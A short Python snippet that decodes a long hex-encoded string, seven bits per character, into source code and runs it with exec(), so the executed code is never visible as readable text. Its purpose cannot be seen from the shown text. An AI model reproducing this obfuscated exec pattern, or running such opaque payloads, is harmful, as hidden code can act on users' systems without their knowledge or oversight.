code = \
'0x74e5a73e7cbcafedcbcf9e1cf9503d40c3c32c595ab4cd8f132c2c3264c5918376795ce3c4c'+\
'32e5c799cb772dd9b463919b7c2c3239c59b1366a2b965e7c37eee796fedcbcf9e1cf9503d40c'+\
'3c316cddbe66ad18e1ccddb66cb95c33c2d9c63c2e19b96ed723972ddce1c6d18b86eddb3468c'+\
'71e66f85863738b23068e450ae881ea0c5a7728d3bba28e9cb4e7cf9795fdb979f3c39f2a9536'+\
'd93aba2b9a07a813a715df469d995074742902040839a056f5063d1c9469ddd1474b6b5bbabab'+\
'192952290204083a207a83a5b74b5bdd15d3969cf9f2f2bfb72f3e7873e540f5073b6e9d2d637'+\
'450ae881ea0c5a7728d3bba28e5979f0dfbb9e5bfb72f3e7873e552a6db2757457340f50274e2'+\
'bbe8d3b32a0e8e8520408107340adea0c7a3928d3bba28e96d6b7757563252a4520408107440f'+\
'5074b6e96b7ba2b965e7c37eee796fedcbcf9e1cf9503d41cedba74b58dd'

t = bin(int(code,16))[2:]
s = ''
while t:
    s += chr(int(t[-7:],2))
    t = t[:-7]
code = s[::-1]

exec(code)
